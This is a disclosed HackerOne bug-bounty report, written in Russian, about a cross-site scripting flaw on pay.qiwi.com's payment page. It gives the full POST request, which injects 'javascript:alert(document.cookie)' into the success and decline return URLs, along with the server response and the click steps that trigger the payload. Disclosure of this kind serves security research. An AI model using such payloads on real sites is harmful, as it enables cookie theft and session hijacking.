---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '198251'
original_report_id: '198251'
title: '[XSS/pay.qiwi.com] Pay SubDomain Hard-Use XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2017-01-13T23:12:49.617Z'
disclosed_at: '2017-06-13T08:22:28.755Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [XSS/pay.qiwi.com] Pay SubDomain Hard-Use XSS

## Metadata

- HackerOne Report ID: 198251
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2017-06-13T08:22:28.755Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Если сделать запрос 
```
POST https://pay.qiwi.com/paypage/initial HTTP/1.1
Host: pay.qiwi.com
Content-Length: 219
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

opcode=1&merchant_site=99&currency=643&sign=bb5c48ea540035e6b7c03c8184f74f09d26e9286a9b8f34b236b1bf2587e4268&amount=1&success_url=javascript%3Aalert(document.cookie)%3B&decline_url=javascript%3Aalert(document.cookie)%3B
```
То возвратится:
```
HTTP/1.1 302 Found
Server: nginx
Date: Fri, 13 Jan 2017 23:08:46 GMT
Content-Length: 0
Connection: keep-alive
Set-Cookie: 7d2861a94f0c8b8b0006ea2db9952d77=3359f97c-4551-4096-8592-97f7eb6d134e;Expires=Tue, 14-Jan-2020 16:36:22 GMT
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Location: https://pay.qiwi.com/?token=2193dfca-2045-4288-892d-7c6c2ac13bf7
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
```
Оплачиваем или отменяем счет `https://pay.qiwi.com/?token=2193dfca-2045-4288-892d-7c6c2ac13bf7` после чего нажимаем `Вернутся в магазин`, что вызывает `javascript:alert(document.cookie);`

{F152273}
{F152272}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
